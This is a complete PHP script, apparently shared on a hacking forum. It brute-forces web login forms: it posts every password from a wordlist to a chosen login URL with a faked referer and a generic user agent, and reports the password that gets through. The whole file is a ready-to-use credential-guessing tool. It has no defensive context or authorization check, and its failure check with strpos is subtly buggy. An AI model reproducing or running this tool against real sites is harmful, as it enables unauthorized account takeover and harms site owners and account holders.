<?php
//  preDict by milomir@hf

$username = ""; // username
$url = ""; // url to the page where the post is sent
$list = "passlist.txt"; // wordlist/passwords, one per line
$error = ""; // text you get when login fails

$usernameField = "username"; // name of the username form field
$passwordField = "password"; // name of the password form field

$extraFields = ""; // extra form fields, add & first, for example &field1=field

$referer = "http://www.google.com/"; // referer, can be left blank
$splitlist = "\r\n"; // for splitting the passwords, \r\n for new line on windows, \n for new line on linux and \r for new line on mac

$passwords = explode($splitlist, file_get_contents($list));

foreach($passwords as $password)
{
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_REFERER, $referer);
  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla 5.0");
  curl_setopt($ch, CURLOPT_POSTFIELDS, "{$usernameField}={$username}&{$passwordField}={$password}{$extraFields}");
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  $result = curl_exec($ch);

  if(!strpos($result, $error))
  {
    $result = "Success! Password is {$password}";
    break;
  }
  else
    $result = "Failed, no password found :(";
}

echo $result;
exit();

?>
